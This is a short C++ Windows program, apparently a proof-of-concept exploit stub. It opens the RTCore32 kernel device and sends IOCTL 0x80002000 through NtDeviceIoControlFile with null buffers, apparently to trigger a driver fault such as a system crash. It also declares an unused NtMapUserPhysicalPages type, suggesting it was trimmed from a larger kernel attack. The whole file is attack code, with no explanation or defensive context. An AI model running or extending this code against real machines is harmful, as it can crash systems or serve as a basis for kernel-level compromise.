#include <windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <profileapi.h>
HANDLE hDriver;
char temp[4096]{};
typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID    Pointer;
	} DUMMYUNIONNAME;
	ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
typedef NTSTATUS(WINAPI* NtMapUserPhysicalPages)(
	IN PVOID          VirtualAddress,
	IN ULONG_PTR      NumberOfPages,
	IN OUT PULONG_PTR UserPfnArray);
NtMapUserPhysicalPages sNtMapUserPhysicalPages;

typedef NTSTATUS(NTAPI* NtDeviceIoControlFile)(
	HANDLE           FileHandle,
	HANDLE           Event,
	PVOID            ApcRoutine,
	PVOID            ApcContext,
	PIO_STATUS_BLOCK IoStatusBlock,
	ULONG            IoControlCode,
	PVOID            InputBuffer,
	ULONG            InputBufferLength,
	PVOID            OutputBuffer,
	ULONG            OutputBufferLength
	);
int main() {

	hDriver = CreateFileA("\\\\.\\GLOBALROOT\\Device\\RTCore32", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("[!] Unable to get a handle on the device\n");
		getchar();
		return -1;
	}
	LPCWSTR nt = L"ntdll";
	HMODULE hntdll = GetModuleHandle(nt);
	IO_STATUS_BLOCK p = {};
	NtDeviceIoControlFile tDeviceIoControl = (NtDeviceIoControlFile)GetProcAddress((HMODULE)hntdll, "NtDeviceIoControlFile");
	if (!tDeviceIoControl) {
		printf("[-] Fail to resolve ZwDeviceIoControlFile(0x%X)\n", GetLastError());
		getchar();
	}

	tDeviceIoControl(hDriver, 0, 0, 0, &p, 0x80002000, 0, 0, 0,0);
	return 0;
}
